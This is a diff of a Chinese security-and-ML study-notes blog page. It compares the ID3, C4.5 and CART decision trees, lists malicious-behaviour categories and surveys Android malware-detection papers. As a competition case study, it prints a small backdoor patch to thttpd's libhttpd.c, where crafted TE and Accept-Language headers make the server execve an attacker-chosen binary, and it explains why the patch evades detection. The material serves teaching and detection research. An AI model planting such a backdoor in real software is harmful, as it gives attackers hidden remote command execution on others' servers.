@@ -1264,11 +1470,24 @@ $$<br>
 <p>最后通过总结的方式对比下 ID3、C4.5 和 CART 三者之间的差异。</p>
 <p>除了之前列出来的划分标准、剪枝策略、连续值确实值处理方式等之外，我再介绍一些其他差异：</p>
 <ul>
-<li>**划分标准的差异：**ID3 使用信息增益偏向特征值多的特征，C4.5 使用信息增益率克服信息增益的缺点，偏向于特征值小的特征，CART 使用基尼指数克服 C4.5 需要求 log 的巨大计算量，偏向于特征值较多的特征。</li>
-<li>**使用场景的差异：**ID3 和 C4.5 都只能用于分类问题，CART 可以用于分类和回归问题；ID3 和 C4.5 是多叉树，速度较慢，CART 是二叉树，计算速度很快；</li>
-<li>**样本数据的差异：**ID3 只能处理离散数据且缺失值敏感，C4.5 和 CART 可以处理连续性数据且有多种方式处理缺失值；从样本量考虑的话，小样本建议 C4.5、大样本建议 CART。C4.5 处理过程中需对数据集进行多次扫描排序，处理成本耗时较高，而 CART 本身是一种大样本的统计方法，小样本处理下泛化误差较大 ；</li>
-<li>**样本特征的差异：**ID3 和 C4.5 层级之间只使用一次特征，CART 可多次重复使用特征（连续型）；</li>
-<li>**剪枝策略的差异：**ID3 没有剪枝策略，C4.5 是通过悲观剪枝策略来修正树的准确性，而 CART 是通过代价复杂度剪枝。</li>
+<li><strong>划分标准的差异：</strong>ID3
+使用信息增益偏向特征值多的特征，C4.5
+使用信息增益率克服信息增益的缺点，偏向于特征值小的特征，CART
+使用基尼指数克服 C4.5 需要求 log
+的巨大计算量，偏向于特征值较多的特征。</li>
+<li><strong>使用场景的差异：</strong>ID3 和 C4.5
+都只能用于分类问题，CART 可以用于分类和回归问题；ID3 和 C4.5
+是多叉树，速度较慢，CART 是二叉树，计算速度很快；</li>
+<li><strong>样本数据的差异：</strong>ID3
+只能处理离散数据且缺失值敏感，C4.5 和 CART
+可以处理连续性数据且有多种方式处理缺失值；从样本量考虑的话，小样本建议
+C4.5、大样本建议 CART。C4.5
+处理过程中需对数据集进行多次扫描排序，处理成本耗时较高，而 CART
+本身是一种大样本的统计方法，小样本处理下泛化误差较大 ；</li>
+<li><strong>样本特征的差异：</strong>ID3 和 C4.5
+层级之间只使用一次特征，CART 可多次重复使用特征（连续型）；</li>
+<li><strong>剪枝策略的差异：</strong>ID3 没有剪枝策略，C4.5
+是通过悲观剪枝策略来修正树的准确性，而 CART 是通过代价复杂度剪枝。</li>
 </ul>
 
       
@@ -1359,14 +1578,14 @@ $$<br>
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>3.7k</span>
+      <span>4.2k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>7 分钟</span>
+      <span>8 分钟</span>
     </span>
 </div>
 
@@ -1377,11 +1596,17 @@ $$<br>
     
     
     <div class="post-body" itemprop="articleBody">
-          <h2 id="决策树——ID3、C4-5、CART"><a class="header-anchor" href="#决策树——ID3、C4-5、CART">¶</a>决策树——ID3、C4.5、CART</h2>
+          <h2 id="决策树id3c4.5cart">决策树——ID3、C4.5、CART</h2>
 <p><strong>决策树</strong>是一个非常常见并且优秀的机器学习算法，它易于理解、可解释性强，其可作为分类算法，也可用于回归模型。</p>
 <table>
+<colgroup>
+<col style="width: 7%">
+<col style="width: 30%">
+<col style="width: 30%">
+<col style="width: 30%">
+</colgroup>
 <thead>
-<tr>
+<tr class="header">
 <th>算法</th>
 <th>ID3（分类）</th>
 <th>C4.5（分类）</th>
@@ -1389,62 +1614,91 @@ $$<br>
 </tr>
 </thead>
 <tbody>
-<tr>
+<tr class="odd">
 <td>思想</td>
-<td>奥卡姆剃刀：越是小型的决策树越优于大的决策树;ID3 算法的核心思想就是以<strong>信息增益</strong>来度量特征选择，选择信息增益最大的特征进行分裂。算法采用自顶向下的贪婪搜索遍历可能的决策树空间。</td>
-<td>C4.5 算法最大的特点是<strong>克服了 ID3 对特征数目的偏重</strong>这一缺点，引入<strong>信息增益率</strong>来作为分类标准。</td>
-<td>CART 算法的二分法可以<strong>简化决策树的规模</strong>，提高生成决策树的效率。CART 包含的基本过程有<strong>分裂</strong>，<strong>剪枝</strong>和<strong>树选择</strong>。</td>
+<td>奥卡姆剃刀：越是小型的决策树越优于大的决策树;ID3
+算法的核心思想就是以<strong>信息增益</strong>来度量特征选择，选择信息增益最大的特征进行分裂。算法采用自顶向下的贪婪搜索遍历可能的决策树空间。</td>
+<td>C4.5 算法最大的特点是<strong>克服了 ID3
+对特征数目的偏重</strong>这一缺点，引入<strong>信息增益率</strong>来作为分类标准。</td>
+<td>CART
+算法的二分法可以<strong>简化决策树的规模</strong>，提高生成决策树的效率。CART
+包含的基本过程有<strong>分裂</strong>，<strong>剪枝</strong>和<strong>树选择</strong>。</td>
 </tr>
-<tr>
+<tr class="even">
 <td><strong>划分标准</strong></td>
-<td><strong>信息增益</strong>  =  类别熵 - 特征类别熵                                <strong>类别熵</strong>：$H(D)=-\sum_{k=1}^{K} \frac{\left</td>
-<td>C_{k}\right</td>
-<td>}{</td>
+<td><strong>信息增益</strong> = 类别熵 - 特征类别熵
+<strong>类别熵</strong>：<span class="math inline">\(H(D)=-\sum_{k=1}^{K}
+\frac{\left|C_{k}\right|}{|D|} \log _{2}
+\frac{\left|C_{k}\right|}{|D|}\)</span>
+<strong>特征类别熵</strong>：<span class="math inline">\(H(D \mid
+A)=\sum_{i=1}^{n} \frac{\left|D_{i}\right|}{|D|}
+H\left(D_{i}\right)\)</span></td>
+<td>先从候选划分特征中找到信息增益高于平均值的特征，再从中选择<strong>增益率</strong>最高的。</td>
+<td><strong>Gini
+系数</strong>作为变量的<strong>不纯度量</strong>，<strong>减少了大量的对数运算</strong>；<span class="math inline">\(G i n i(D)=\sum_{k=1}^{K}
+\frac{\left|C_{k}\right|}{|D|}\left(1-\frac{\left|C_{k}\right|}{|D|}\right)\)</span></td>
 </tr>
-<tr>
+<tr class="odd">
 <td>剪枝策略</td>
 <td><strong>无</strong></td>
 <td><strong>悲观剪枝策略</strong></td>
 <td>基于<strong>代价复杂度剪枝</strong></td>
 </tr>
-<tr>
+<tr class="even">
 <td>数据差异</td>
 <td><strong>离散</strong>数据且<strong>缺失值</strong>敏感</td>
 <td><strong>离散</strong>、<strong>连续特征离散化</strong>；【排序+离散化】</td>
 <td><strong>连续型、离散型</strong></td>
 </tr>
-<tr>
+<tr class="odd">
 <td><strong>连续值处理</strong></td>
 <td>无</td>
 <td><strong>排序</strong>并取相邻两样本值的<strong>平均数</strong>。</td>
-<td><strong>排序</strong>并取相邻两样本值的<strong>平均数</strong>。<strong>CART 分类树</strong>【<strong>基尼系数</strong>】。<strong>回归树</strong>【<strong>和方差度量</strong>】。</td>
+<td><strong>排序</strong>并取相邻两样本值的<strong>平均数</strong>。<strong>CART
+分类树</strong>【<strong>基尼系数</strong>】。<strong>回归树</strong>【<strong>和方差度量</strong>】。</td>
 </tr>
-<tr>
+<tr class="even">
 <td>缺失值处理</td>
 <td><strong>无</strong></td>
 <td>1、有缺失值特征，用没有缺失的样本子集所占比重来折算；2、将样本同时划分到所有子节点</td>
 <td><strong>代理测试</strong>来估计缺失值</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>类别不平衡</td>
 <td><strong>无</strong></td>
 <td><strong>无</strong></td>
 <td><strong>先验机制</strong>：其作用相当于对数据自动重加权，对类别进行均衡。</td>
 </tr>
-<tr>
+<tr class="even">
 <td><strong>缺点</strong></td>
-<td>1、ID3 没有剪枝策略，容易过拟合；2、信息增益准则对可取值<strong>数目较多的特征有所偏好</strong>，类似“编号”的特征其信息增益接近于 1； 3、只能用于处理离散分布的特征； 没有考虑缺失值。</td>
+<td>1、ID3
+没有剪枝策略，容易过拟合；2、信息增益准则对可取值<strong>数目较多的特征有所偏好</strong>，类似“编号”的特征其信息增益接近于
+1； 3、只能用于处理离散分布的特征； 没有考虑缺失值。</td>
 <td>1、<strong>多叉树</strong>。2、<strong>只能用于分类</strong>。3、熵模型拥有大量耗时的<strong>对数运算</strong>，连续值还有<strong>排序运算</strong>。4、驻留于内存的数据集。</td>
 <td>熵模型拥有大量耗时的<strong>对数运算</strong>，连续值还有<strong>排序运算</strong>。</td>
 </tr>
 </tbody>
 </table>
 <ul>
-<li>**划分标准的差异：**ID3 使用信息增益偏向特征值多的特征，C4.5 使用信息增益率克服信息增益的缺点，偏向于特征值小的特征，CART 使用基尼指数克服 C4.5 需要求 log 的巨大计算量，偏向于特征值较多的特征。</li>
-<li>**使用场景的差异：**ID3 和 C4.5 都只能用于分类问题，CART 可以用于分类和回归问题；ID3 和 C4.5 是多叉树，速度较慢，CART 是二叉树，计算速度很快；</li>
-<li>**样本数据的差异：**ID3 只能处理离散数据且缺失值敏感，C4.5 和 CART 可以处理连续性数据且有多种方式处理缺失值；从样本量考虑的话，小样本建议 C4.5、大样本建议 CART。C4.5 处理过程中需对数据集进行多次扫描排序，处理成本耗时较高，而 CART 本身是一种大样本的统计方法，小样本处理下泛化误差较大 ；</li>
-<li>**样本特征的差异：**ID3 和 C4.5 层级之间只使用一次特征，CART 可多次重复使用特征；</li>
-<li><strong>剪枝策略的差异：<strong>ID3 没有剪枝策略，C4.5 是通过</strong>悲观剪枝策略</strong>来修正树的准确性，而 CART 是通过<strong>代价复杂度</strong>剪枝。</li>
+<li><strong>划分标准的差异：</strong>ID3
+使用信息增益偏向特征值多的特征，C4.5
+使用信息增益率克服信息增益的缺点，偏向于特征值小的特征，CART
+使用基尼指数克服 C4.5 需要求 log
+的巨大计算量，偏向于特征值较多的特征。</li>
+<li><strong>使用场景的差异：</strong>ID3 和 C4.5
+都只能用于分类问题，CART 可以用于分类和回归问题；ID3 和 C4.5
+是多叉树，速度较慢，CART 是二叉树，计算速度很快；</li>
+<li><strong>样本数据的差异：</strong>ID3
+只能处理离散数据且缺失值敏感，C4.5 和 CART
+可以处理连续性数据且有多种方式处理缺失值；从样本量考虑的话，小样本建议
+C4.5、大样本建议 CART。C4.5
+处理过程中需对数据集进行多次扫描排序，处理成本耗时较高，而 CART
+本身是一种大样本的统计方法，小样本处理下泛化误差较大 ；</li>
+<li><strong>样本特征的差异：</strong>ID3 和 C4.5
+层级之间只使用一次特征，CART 可多次重复使用特征；</li>
+<li><strong>剪枝策略的差异：</strong>ID3 没有剪枝策略，C4.5
+是通过<strong>悲观剪枝策略</strong>来修正树的准确性，而 CART
+是通过<strong>代价复杂度</strong>剪枝。</li>
 </ul>
           <!--noindex-->
             <div class="post-button">
@@ -1562,9 +1816,9 @@ $$<br>
     <div class="post-body" itemprop="articleBody">
           <h3><span id="供应链及物理网安全">供应链及物理网安全</span></h3>
 <blockquote>
-<h5><span id="1-apk分析">1、</span></h5>
+<p>##### 1、<a target="_blank" rel="noopener" href="https://developer.android.com/studio/build/apk-analyzer?hl=zh-cn">APK分析</a></p>
 <p>考察点：逆向分析、文档收集、数据分析</p>
-<h5><span id="2-软件供应链安全分析">2、软件供应链安全分析</span></h5>
+<p>##### 2、软件供应链安全分析</p>
 <ul>
 <li>MaMaDroid【13】</li>
 <li><a target="_blank" rel="noopener" href="https://github.com/MLDroid/drebin">Drebin</a> 【14】</li>
@@ -1572,14 +1826,20 @@ $$<br>
 </ul>
 <p>==考察点：二进制代码分析，二进制函数特征提取，补丁比较，源代码分析==</p>
 <ul>
-<li>如V. Livshits 等使用静态分析的方法在Java 源代码中进行脆弱性(vulnerability)检测的策略[47]。</li>
-<li>G. Grieco 和G. Grinblat 等使用机器学习方法根据软件的内存错误信息训练测试模型, 检测软件漏洞的研究[49] <em><strong>Toward Large-Scale Vulnerability Discovery Using Machine Learning</strong></em></li>
-<li>彭小详等人的研究针对加壳技术, 提出了对恶意程序进行自动脱壳的方法[59]。<em><strong>Research of Malicious Code in Automatic Unpacking</strong></em></li>
+<li>如V. Livshits 等使用静态分析的方法在Java
+源代码中进行脆弱性(vulnerability)检测的策略[47]。</li>
+<li>G. Grieco 和G. Grinblat
+等使用机器学习方法根据软件的内存错误信息训练测试模型,
+检测软件漏洞的研究[49] <strong><em>Toward Large-Scale Vulnerability
+Discovery Using Machine Learning</em></strong></li>
+<li>彭小详等人的研究针对加壳技术,
+提出了对恶意程序进行自动脱壳的方法[59]。<strong><em>Research of
+Malicious Code in Automatic Unpacking</em></strong></li>
 <li><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_34168880/article/details/86753392">「功守道」软件供应链安全大赛·C源代码赛季启示录</a></li>
 </ul>
 </blockquote>
 <blockquote>
-<h5><span id="3-powershell反混淆">3、</span></h5>
+<p>##### 3、<a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/219057.html">PowerShell反混淆</a></p>
 <p>考察点：代码分析， 混淆语句定位、还原</p>
 </blockquote>
 <ul>
@@ -1587,32 +1847,33 @@ $$<br>
 <li>CCleaner投毒</li>
 </ul>
 <h5><span id="混淆原理">混淆原理</span></h5>
-<p>网上帖子太多了，可以参考下看雪论坛用户发的翻译贴：<br>
-<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-248034.htm">https://bbs.pediy.com/thread-248034.htm</a></p>
+<p>网上帖子太多了，可以参考下看雪论坛用户发的翻译贴：
+https://bbs.pediy.com/thread-248034.htm</p>
 <h5><span id="自动化反混淆工具">自动化反混淆工具</span></h5>
-<p><a target="_blank" rel="noopener" href="http://xn--Unit42PowerShellProfiler-qy63boybz56g0h1abs7nsz3bbixj.py">Unit42安全团队编写的PowerShellProfiler.py</a>：<br>
-github地址：<br>
-<a target="_blank" rel="noopener" href="https://github.com/pan-unit42/public_tools/tree/master/powershellprofiler">https://github.com/pan-unit42/public_tools/tree/master/powershellprofiler</a><br>
-用法及原理参考：<br>
-<a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/219057.html">https://www.freebuf.com/sectool/219057.html</a></p>
+<p>Unit42安全团队编写的PowerShellProfiler.py： github地址：
+https://github.com/pan-unit42/public_tools/tree/master/powershellprofiler
+用法及原理参考： https://www.freebuf.com/sectool/219057.html</p>
 <blockquote>
-<h5><span id="4-物联网漏洞挖掘">4、物联网漏洞挖掘</span></h5>
+<p>##### 4、物联网漏洞挖掘</p>
 <p>考察点：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1543779">常见漏洞原理</a>，二进制逆向工程，自动化程序分析</p>
 </blockquote>
 <h4><span id="相关论文">相关论文</span></h4>
 <blockquote>
-<p>DroidMD: an efficient and scalable Android malware detection approach at source code level (2021 C&amp;S)</p>
-<p>Detection of Repackaged Android Malware with Code-Heterogeneity Features.(2020 TDSC)</p>
+<p>DroidMD: an efficient and scalable Android malware detection approach
+at source code level (2021 C&amp;S)</p>
+<p>Detection of Repackaged Android Malware with Code-Heterogeneity
+Features.(2020 TDSC)</p>
 </blockquote>
 <h5><span id="11-软件供应链">1.1 软件供应链</span></h5>
 <p><a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/276951.html">软件供应链安全工具DependencyTrack的使用</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bonelee/p/13768901.html">https://www.cnblogs.com/bonelee/p/13768901.html</a></p>
+<p>https://www.cnblogs.com/bonelee/p/13768901.html</p>
 <h5><span id="12-物联网安全">1.2 物联网安全</span></h5>
 <h3><span id="常见恶意行为">常见恶意行为</span></h3>
 <blockquote>
 <p>*标注为单点确定性恶意行为，**标注为二阶段恶意行为中的上游或下游行为，#标注为复合恶意行为</p>
 </blockquote>
-<p>* <strong>敏感信息异常采集</strong>:针对生产环境，最大的威胁不是造成应用执行异常，而是在无形中泄漏关键敏感数据，包括可能造成机器控制权丧失的系统相关配置数据，关键的应用存储的用户数据等。</p>
+<p>*
+<strong>敏感信息异常采集</strong>:针对生产环境，最大的威胁不是造成应用执行异常，而是在无形中泄漏关键敏感数据，包括可能造成机器控制权丧失的系统相关配置数据，关键的应用存储的用户数据等。</p>
 <ul>
 <li>口令与秘钥类型文件直接操作 *</li>
 <li>系统敏感配置文件绕过API直接读取 *</li>
@@ -1622,7 +1883,8 @@ github地址：<br>
 <li>系统一般描述性信息采集 **</li>
 <li>软件供应链上游特定资源数据探测、获取和泄漏（如源码遍历泄漏） #</li>
 </ul>
-<p>* <strong>关键数据篡改</strong>:任何需要在生产环境上，修改、写入数据或代码从而实现恶意打击的行为，我们统一归纳到这一类里面，较为泛化。</p>
+<p>*
+<strong>关键数据篡改</strong>:任何需要在生产环境上，修改、写入数据或代码从而实现恶意打击的行为，我们统一归纳到这一类里面，较为泛化。</p>
 <ul>
 <li>覆盖、篡改或插入口令秘钥类型文件用以账户植入 *</li>
 <li>系统、用户环境变量和关键配置文件修改 **</li>
@@ -1638,32 +1900,30 @@ github地址：<br>
 <li>关键可执行文件（系统应用/关键服务端应用/关键库）下载/释放 **</li>
 <li>网络传入指令/地址类型数据且无校验执行/访问 *</li>
 </ul>
-<p>* <strong>不可信信息外传渠道</strong>。对应于上面的传入。敏感数据的采集后，需要搭配对应的下游传出才能形成完整恶意行为链路，常规可能的渠道形式分为两类。</p>
+<p>*
+<strong>不可信信息外传渠道</strong>。对应于上面的传入。敏感数据的采集后，需要搭配对应的下游传出才能形成完整恶意行为链路，常规可能的渠道形式分为两类。</p>
 <ul>
 <li>上游数据未脱敏形式的网络传出（TCP/UDP/ICMP） **</li>
 <li>上游数据未脱敏形式的本地确定位置落盘 **</li>
 </ul>
-<p>* <strong>其它典型木马后门行为</strong>。在上述行为框架之外，在生产环境上具有非单纯破坏效果的恶意行为，划分为此类，包括但不限于：</p>
+<p>*
+<strong>其它典型木马后门行为</strong>。在上述行为框架之外，在生产环境上具有非单纯破坏效果的恶意行为，划分为此类，包括但不限于：</p>
 <ul>
-<li>
-<p>键盘hook等输入监控行为 *</p>
-</li>
-<li>
-<p>网络劫持行为 *</p>
-</li>
-<li>
-<p>全局挂钩注入行为 **</p>
-</li>
-<li>
-<p>远程控制 #</p>
-</li>
+<li><p>键盘hook等输入监控行为 *</p></li>
+<li><p>网络劫持行为 *</p></li>
+<li><p>全局挂钩注入行为 **</p></li>
+<li><p>远程控制 #</p></li>
 </ul>
 <h3><span id="经典赛题事例">经典赛题事例</span></h3>
 <p><strong>#1：thttpd后门陷阱</strong></p>
 <p>从基础软件或应用上面入手，稳定可控的后门是最佳选择。而在一个无关应用中突兀地出现网络连接，隐蔽性总归很差；在thttpd当中，以很袖珍的代码实现稳定的后门，是这里首先要呈现的一个题目。</p>
 <p>在thttpd项目，恶意代码嵌入到libhttpd.c文件中，上下游恶意代码相关上下文：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">*** /thttpd/libhttpd.c</span><br><span class="line"></span><br><span class="line">--- malware/libhttpd.c</span><br><span class="line"></span><br><span class="line">*************** <span class="title function_">httpd_parse_request</span><span class="params">( httpd_conn* hc )</span></span><br><span class="line"></span><br><span class="line">*** 2102,2107 ****</span><br><span class="line"></span><br><span class="line">--- 2102,2113 ----</span><br><span class="line"></span><br><span class="line">cp += <span class="built_in">strspn</span>( cp, <span class="string">&quot; \t&quot;</span> );</span><br><span class="line"></span><br><span class="line">hc-&gt;useragent = cp;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">+ <span class="keyword">else</span> <span class="keyword">if</span> ( strncasecmp( buf, <span class="string">&quot;TE:&quot;</span>, <span class="number">3</span> ) == <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">+ &#123;</span><br><span class="line"></span><br><span class="line">+ cp = &amp;buf[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">+ cp += <span class="built_in">strspn</span>( cp, <span class="string">&quot; \t&quot;</span>);</span><br><span class="line"></span><br><span class="line">+ hc-&gt;hs-&gt;cgi_pattern = cp;</span><br><span class="line"></span><br><span class="line">+ &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( strncasecmp( buf, <span class="string">&quot;Host:&quot;</span>, <span class="number">5</span> ) == <span class="number">0</span> )</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">cp = &amp;buf[<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line">*************** cgi_child( httpd_conn* hc )</span><br><span class="line"></span><br><span class="line">*** <span class="number">3560</span>,<span class="number">3565</span> ****</span><br><span class="line"></span><br><span class="line">--- <span class="number">3566</span>,<span class="number">3576</span> ----</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* HAVE_SIGSET */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Run the program. */</span></span><br><span class="line"></span><br><span class="line">+ <span class="keyword">if</span> ( <span class="built_in">strstr</span>( hc-&gt;acceptl, <span class="string">&quot;en;q=1.1&quot;</span>) != (<span class="type">char</span>*)<span class="number">0</span> )</span><br><span class="line"></span><br><span class="line">+ &#123;</span><br><span class="line"></span><br><span class="line">+ binary = argp[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">+ argp++;</span><br><span class="line"></span><br><span class="line">+ &#125;</span><br><span class="line"></span><br><span class="line">(<span class="type">void</span>) execve( binary, argp, envp );</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Something went wrong. */</span></span><br></pre></td></tr></table></figure>
-<p>后门会根据http头判断是否开启cgi功能，并根据http头Accept-Language决定解析执行文件的路径。上述代码段中，首先通过http头TE:设置开启cgi功能（对应上述代码中，httpd_parse_request函数中插入的else if ( strncasecmp( buf, “TE:”, 3 ) == 0) {…}代码块）。而下游代码同样巧妙，指定特殊的Accept-Language: en;q=1.1决定是否执行指定的系统命令（即cgi_child函数插入的if ( strstr( hc-&gt;acceptl, “en;q=1.1”) != (char*)0 ) {…}代码块）。</p>
+<p>后门会根据http头判断是否开启cgi功能，并根据http头Accept-Language决定解析执行文件的路径。上述代码段中，首先通过http头TE:设置开启cgi功能（对应上述代码中，httpd_parse_request函数中插入的else
+if ( strncasecmp( buf, "TE:", 3 ) == 0)
+{...}代码块）。而下游代码同样巧妙，指定特殊的Accept-Language:
+en;q=1.1决定是否执行指定的系统命令（即cgi_child函数插入的if ( strstr(
+hc-&gt;acceptl, "en;q=1.1") != (char*)0 ) {...}代码块）。</p>
 <p>本例恶意行为的主要特点：</p>
 <ul>
 <li>该后门的嵌入，新增代码量极小（共7行），巧妙借用了thttpd处理用户请求、cgi的原本逻辑，借用了execve的调用，没有任何新增的API调用等行为，可以躲避有意识的行为特征匹配检测。</li>
@@ -1786,16 +2046,13 @@ github地址：<br>
 <p>Period :2014-2021</p>
 </blockquote>
 <ul>
-<li>
-<h5><span id="platform">Platform</span></h5>
+<li><h5><span id="platform">Platform</span></h5>
 <ul>
 <li>Windows [13,32]</li>
 <li>Android [1-3,11,14,16,18,23,25,33,35-37,40]</li>
 <li>Linux</li>
-</ul>
-</li>
-<li>
-<h5><span id="direction">Direction</span></h5>
+</ul></li>
+<li><h5><span id="direction">Direction</span></h5>
 <ul>
 <li>Malware features from various aspects [1,9,24,28,31,40]</li>
 <li>Malware propagation(传播) [2,25]</li>
@@ -1807,31 +2064,36 @@ github地址：<br>
 <li>Stealth technologies [3,6]</li>
 <li>Hook</li>
 <li>Evasion from dynamic analysis [10,17,20,31,62]</li>
-</ul>
-</li>
+</ul></li>
 <li>Dataset challenges, such as aging problem [21,23,41,51]</li>
 <li>Performance metrics[14,23]</li>
-<li>Specific malware：such as IoT malware[25,26,39], fileless[30] and PDF malware[43,54]</li>
+<li>Specific malware：such as IoT malware[25,26,39], fileless[30] and
+PDF malware[43,54]</li>
 <li>Visualization [15]</li>
 <li>Graph representation [22]</li>
 <li><strong>Detection Methods</strong> [3-4,8,9,11,12,14,16,19,31,33,36]
 <ul>
 <li>ML based techniques [13,18,21,29,38,40]</li>
 <li>DL based techniques [22,29,35]</li>
-</ul>
-</li>
+</ul></li>
 <li><strong>APT</strong>(Advanced Persistent Threats) [20]</li>
 <li><strong>Adversarial malware example generation</strong> [27,32]</li>
 <li>ML/DL flaws [7,28]</li>
 <li>ML/DL interpretability [34]</li>
-</ul>
-</li>
+</ul></li>
 </ul>
 <h2><span id="2-android-malware-detection">2. Android Malware detection</span></h2>
 <h3><span id="21-behavior-detection-6364">2.1 Behavior detection [63,64]</span></h3>
 <table>
+<colgroup>
+<col style="width: 27%">
+<col style="width: 1%">
+<col style="width: 26%">
+<col style="width: 21%">
+<col style="width: 22%">
+</colgroup>
 <thead>
-<tr>
+<tr class="header">
 <th>Title</th>
 <th>Year</th>
 <th>Motivation</th>
@@ -1840,15 +2102,17 @@ github地址：<br>
 </tr>
 </thead>
 <tbody>
-<tr>
-<td>Malton:Towards On-Device Non-Invasive Mobile Malware Analysis for ART</td>
+<tr class="odd">
+<td>Malton:Towards On-Device Non-Invasive Mobile Malware Analysis for
+ART</td>
 <td>2017</td>
 <td>Toprovide a comprehensive view of malware’s behaviors</td>
 <td>Detectingeffectively</td>
 <td>multi-layermonitoring &amp; information flow tracking</td>
 </tr>
-<tr>
-<td>CopperDroid:Automatic Reconstruction of Android Malware Behaviors</td>
+<tr class="even">
+<td>CopperDroid:Automatic Reconstruction of Android Malware
+Behaviors</td>
 <td>2015</td>
 <td>Toidentify OS- and high-level Android-specific behaviors.</td>
 <td>Toreconstruct the behaviors of Android malware</td>
@@ -1858,8 +2122,15 @@ github地址：<br>
 </table>
 <h3><span id="22-signature-based-6566">2.2 Signature based [65,66]</span></h3>
 <table>
+<colgroup>
+<col style="width: 27%">
+<col style="width: 1%">
+<col style="width: 20%">
+<col style="width: 23%">
+<col style="width: 27%">
+</colgroup>
 <thead>
-<tr>
+<tr class="header">
 <th>Title</th>
 <th>Year</th>
 <th>Motivation</th>
@@ -1868,15 +2139,17 @@ github地址：<br>
 </tr>
 </thead>
 <tbody>
-<tr>
+<tr class="odd">
 <td>EnMobile: Entity-based Characterization and Analysis of Mobile</td>
 <td>2018</td>
 <td>Tocharacaterize malware comprehensively</td>
 <td>Detectingeffectively</td>
-<td>entity-based characterization and static analysis; signature based approach</td>
+<td>entity-based characterization and static analysis; signature based
+approach</td>
 </tr>
-<tr>
-<td>Screening smartphone applications using malware family signatures</td>
+<tr class="even">
+<td>Screening smartphone applications using malware family
+signatures</td>
 <td>2015</td>
 <td>Toimprove the robustness of signature matching</td>
 <td>Toautomaticly extract family signature and matching</td>
@@ -1886,8 +2159,15 @@ github地址：<br>
 </table>
 <h3><span id="23-rule-based6768">2.3 Rule based[67,68]</span></h3>
 <table>
+<colgroup>
+<col style="width: 37%">
+<col style="width: 2%">
+<col style="width: 12%">
+<col style="width: 12%">
+<col style="width: 35%">
+</colgroup>
 <thead>
-<tr>
+<tr class="header">
 <th>Title</th>
 <th>Year</th>
 <th>Motivation</th>
@@ -1896,15 +2176,17 @@ github地址：<br>
 </tr>
 </thead>
 <tbody>
-<tr>
-<td>Toward a more dependable hybrid analysis of android malware using aspect-oriented programming</td>
+<tr class="odd">
+<td>Toward a more dependable hybrid analysis of android malware using
+aspect-oriented programming</td>
 <td>2018</td>
 <td>None.</td>
 <td>Detectingeffectively</td>
 <td>dataflowanalysis, detection of resource abuse;rule based</td>
 </tr>
-<tr>
-<td>DroidNative: Automating and optimizing detection of Android native code malware variants</td>
+<tr class="even">
+<td>DroidNative: Automating and optimizing detection of Android native
+code malware variants</td>
 <td>2017</td>
 <td>Todefeat obfuscation</td>
 <td>Detectingeffectively</td>
@@ -1915,8 +2197,15 @@ github地址：<br>
 <h3><span id="24-similarity-based">2.4 Similarity based</span></h3>
 <h4><span id="241-model-similarity69-73">2.4.1 Model similarity[69-73]</span></h4>
 <table>
+<colgroup>
+<col style="width: 33%">
+<col style="width: 2%">
+<col style="width: 21%">
+<col style="width: 11%">
+<col style="width: 32%">
+</colgroup>
 <thead>
-<tr>
+<tr class="header">
 <th>Title</th>
 <th>Year</th>
 <th>Motivation</th>
@@ -1925,35 +2214,39 @@ github地址：<br>
 </tr>
 </thead>
 <tbody>
-<tr>
-<td>An HMM and structural entropy based detector for Android malware: An empirical study</td>
+<tr class="odd">
+<td>An HMM and structural entropy based detector for Android malware: An
+empirical study</td>
 <td>2016</td>
 <td>Todefeat hiding</td>
 <td>Detectingeffectively</td>
 <td>HiddenMarkov Model, structural entropy.</td>
 </tr>
-<tr>
-<td>Scalable and robust unsupervised android malware fingerprinting using community-based network partitioning</td>
+<tr class="even">
+<td>Scalable and robust unsupervised android malware fingerprinting
+using community-based network partitioning</td>
